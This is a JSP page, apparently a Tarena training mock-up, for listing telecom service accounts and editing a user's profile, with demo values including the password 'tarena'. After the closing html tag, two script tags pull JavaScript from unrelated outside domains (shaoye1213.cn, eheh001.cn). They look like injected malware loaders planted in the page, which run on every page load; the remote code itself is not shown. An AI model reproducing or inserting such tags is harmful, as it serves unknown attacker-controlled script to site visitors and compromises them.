<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<html>
<head>
<title> getusersuccess </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center"> 
  <form name="form1" method="post" action="listUser.htm">
    <table width="91%" border="0" align="center">
      <tr bgcolor="#ccddee" class="pp"> 
        <td width="14%" height="6"><span class="pp"><a href="open.htm" class="text_link">开通帐户</a></span></td>
        <td><a href="listUser.htm" class="text_link">用户列表</a> </td>
        <td bgcolor="#ccddee"> <div align="center"><font color="#000000">帐务帐号 
            </font> 
            <input name="textfield2" type="text" size="16">
            <input name="Submit22" type="submit" class="button9p" value="查询">
          </div></td>
      </tr>
    </table>
  </form>
  <form name="form1" method="post" action="services/addServices.htm">
    <table width="76%" border="1" bordercolor="ccccff" bgcolor="ccddee" class="9P">
      <tr align="center" class="yellow"> 
        <td width="13%">状态</td>
        <td width="16%">业务帐号</td>
        <td width="31%">访问的服务器</td>
        <td width="28%">资费名称</td>
        <td width="12%">修改</td>
      </tr>
      <tr align="center"> 
        <td>正常</td>
        <td>aaa_1</td>
        <td>openlab1</td>
        <td>p30-3</td>
        <td><a href="services/servicesmes.htm">修改</a><br> <a href="usermes.htm">暂停</a><br> 
          <a href="usermes.htm">删除</a> </td>
      </tr>
      <tr align="center"> 
        <td height="32">暂停</td>
        <td>aaa_2</td>
        <td>openlab2</td>
        <td>p50-2</td>
        <td> 
          <p><a href="services/servicesmes.htm">修改</a><br>
            <a href="usermes.htm">恢复</a><br>
            <a href="usermes.htm">删除</a></p></td>
      </tr>
      <tr> 
        <td colspan="5"><input type="submit" name="Submit2" value="增加业务帐号"></td>
      </tr>
    </table>
	</form>
    <hr size="1" noshade>
	<form name="form1" method="post" action="listUser.htm">
    <table width="91%" border="1" align="center" bordercolor="#CCCCFF" bgcolor="#ccddee" class="9P">
      <tr> 
        <td height="9" bgcolor="#Ccddee"> <div align="center" class="12p"> 
            <p class="Blue">&nbsp;</p>
          </div></td>
        <td width="369" height="9" bgcolor="#Ccddee"><div align="center"><span class="pp"><strong>tarena</strong></span><span class="9P"> 
            的资料管理 状态</span><span class="11p">[</span><span class="green"><strong>正常</strong>]</span> 
            <span class="pp"> </span></div></td>
        <td bgcolor="#Ccddee">&nbsp;</td>
      </tr>
      <tr> 
        <td width="87" class="12p"><p class="9P">密码 <span class="pp">*</span></p></td>
        <td colspan="2"> <input name="textfield" type="password" value="tarena"> 
          <span class="9P">修改用户的密码（区分大小写）</span></td>
      </tr>
      <tr> 
        <td class="9P">重复密码 <span class="pp">* </span></td>
        <td colspan="2"> <input name="textfield22" type="password" value="tarena"> 
          <span class="9P">请重复键入用户密码</span></td>
      </tr>
      <tr> 
        <td class="9P">姓名<span class="pp"> * </span></td>
        <td colspan="2"> <input name="textfield3" type="text" value="aaa">
          请键入用户的真实姓名</td>
      </tr>
      <tr> 
        <td class="9P">联系方式 <span class="pp">*</span></td>
        <td colspan="2"> <input name="textfield4" type="text" value="12345678">
          请输入有效的联系方式（可不填）</td>
      </tr>
      <tr> 
        <td class="9P">电子邮箱 <span class="pp">*</span></td>
        <td colspan="2"> <input name="textfield5" type="text" value="aaa@tarena.com">
          请输入有效的电子邮箱 </td>
      </tr>
      <tr> 
        <td class="9P">付款方式 <span class="pp">*</span></td>
        <td colspan="2" bordercolor="#9999FF"><input name="payway" type="radio" value="0" checked>
          现金支付 
          <input name="payway" type="radio" value="1">
          银行转帐 
          <input type="radio" name="payway" value="2">
          邮局汇款 
          <input type="radio" name="payway" value="3">
          其他 </td>
      </tr>
      <tr> 
        <td colspan="3" class="9P"><div align="center"> <span class="yellow">以下是附加信息（可不填） 
            </span> 
            <hr>
          </div></td>
      </tr>
      <tr> 
        <td class="9P">职业</td>
        <td colspan="2" bordercolor="#9999FF"><select name="select2">
            <option value="软件工程师" selected>软件工程师</option>
            <option value="医生">医生</option>
          </select></td>
      </tr>
      <tr> 
        <td class="9P">省份 </td>
        <td colspan="2" bordercolor="#9999FF"><select name="select">
            <option value="北京" selected>北京</option>
            <option value="天津">天津</option>
          </select></td>
      </tr>
      <tr> 
        <td class="9P">性别 </td>
        <td colspan="2" bordercolor="#9999FF"><input name="sex" type="radio" value="男" checked>
          男 
          <input type="radio" name="sex" value="女">
          女</td>
      </tr>
      <tr> 
        <td class="9P">公司 </td>
        <td colspan="2" bordercolor="#9999FF"><input type="text" name="textfield6">
          请输入公司名称（可不填）</td>
      </tr>
      <tr> 
        <td class="9P">公司邮箱 </td>
        <td colspan="2" bordercolor="#9999FF"><input type="text" name="textfield7">
          请输入公司电子邮箱（可不填）</td>
      </tr>
      <tr> 
        <td class="9P">邮编 </td>
        <td colspan="3" bordercolor="#9999FF"><input type="text" name="textfield8">
          请输入公司邮编号码（可不填）</td>
      <tr> 
        <td colspan="4" class="9P"><div align="center"> 
            <input type="submit" name="Submit" value="修改">
          </div></td>
    </table>
  </form>
</div>
<center>
  <p class="9P">&nbsp; </p>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律 
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000. 
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>